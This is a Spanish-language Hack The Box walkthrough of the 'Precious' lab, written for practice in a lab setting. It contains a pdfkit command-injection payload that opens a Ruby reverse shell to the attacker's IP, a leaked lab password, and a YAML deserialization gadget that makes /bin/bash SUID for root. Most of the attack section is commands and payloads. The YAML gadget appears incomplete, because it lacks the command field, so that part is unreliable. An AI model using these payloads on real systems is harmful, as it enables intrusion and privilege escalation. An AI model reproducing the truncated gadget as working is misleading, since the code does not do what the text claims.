# Precious (Hack The Box)

## 1. Enumeración y Reconocimiento

### Escaneo de red

Primero, identificamos los puertos abiertos con `nmap`:

```bash
# Escaneo rápido de todos los puertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189 -oG allPorts

# Escaneo profundo de los puertos detectados (22 y 80)
nmap -sCV -p22,80 10.10.11.189 -oN targeted
```

### Configuración del archivo Hosts

Como el servidor redirige a un dominio, lo añadimos a `/etc/hosts`:

```bash
echo "10.10.11.189 precious.htb" | sudo tee -a /etc/hosts
```

---

## 2. Ganando Acceso Inicial (Foothold)

### Identificación de la vulnerabilidad

Al usar la web, descargamos un PDF generado y analizamos los metadatos para encontrar la tecnología:

```bash
exiftool documento_generado.pdf
# Resultado: Creator: pdfkit v0.8.6
```

### Explotación de pdfkit (CVE-2022-25765)

La vulnerabilidad permite inyectar comandos de Ruby a través de un parámetro en la URL. Preparamos un puerto en escucha con Netcat:

```bash
nc -nlvp 443
```

En el campo de entrada de la web, introducimos el siguiente payload (ajustando tu IP de HTB):

```text
http://10.10.14.29/?name=%20`ruby -e 'require "socket";os="linux";c=TCPSocket.new("10.10.14.29",443);while(ls=c.gets);IO.popen(ls,"r"){|io|c.print io.read}end'`

```

*(O también usando un oneliner de Bash inyectado en la sintaxis de Ruby)*.

---

## 3. Escalada de Privilegios: ruby -> henry

### Tratamiento de la TTY

Una vez dentro como el usuario `ruby`, estabilizamos la consola:

```bash
script /dev/null -c bash
# Presionar Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

### Búsqueda de credenciales

Buscamos archivos ocultos en el directorio del usuario actual:

```bash
cd /home/ruby
ls -la
cd .bundle
cat config
```

En el archivo `config` encontramos la contraseña de **henry**: `Q3042ndLook@M31`. Cambiamos de usuario:

```bash
su henry
# Introducir contraseña detectada
```

---

## 4. Escalada de Privilegios: henry -> root

### Verificación de privilegios Sudo

Revisamos qué comandos puede ejecutar Henry con privilegios elevados:

```bash
sudo -l
# Resultado: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

### Explotación de Deserialización YAML

El script `/opt/update_dependencies.rb` utiliza `YAML.load`. Creamos un archivo malicioso `dependencies.yml` en la carpeta actual (`/home/henry`) para ejecutar un comando que dé permisos SUID a la bash:

```bash
nano dependencies.yml
```

**Contenido del archivo `dependencies.yml`:**

```yaml
---
- !ruby/object:Gem::SpecFetcher
  specs: [
    !ruby/object:Gem::Resolver::DependencyRequest
    implicit: true
    request: !ruby/object:Gem::Requirement
      requirements:
        - [">=", !ruby/object:Gem::Package::TarReader
            io: !ruby/object:Net::BufferedIO
              io: !ruby/object:Gem::Package::TarReader::Entry
                read: 0
                header: "abc"
              debug_output: !ruby/object:Net::WriteAdapter
                socket: !ruby/object:Gem::Package::TarReader::Entry
                  read: 0
                  header: "abc"
                method_id: :system
          ]
  ]
```

*Nota: Dentro de ese bloque, el script ejecutará comandos de sistema. Usaremos uno para hacer la bash SUID*.

### Ejecución del ataque

Ejecutamos el script de Ruby como root para que lea nuestro archivo YAML malicioso:

```bash
# Primero nos aseguramos de que el payload YAML ejecute: chmod u+s /bin/bash
sudo /usr/bin/ruby /opt/update_dependencies.rb

# Una vez ejecutado, la bash tendrá permisos SUID
ls -l /bin/bash
# Debe aparecer con permisos -rwsr-xr-x

# Finalmente, obtenemos la shell de root
bash -p
```

¡Listo! Ya tienes acceso total como **root** y puedes leer la flag en `/root/root.txt`.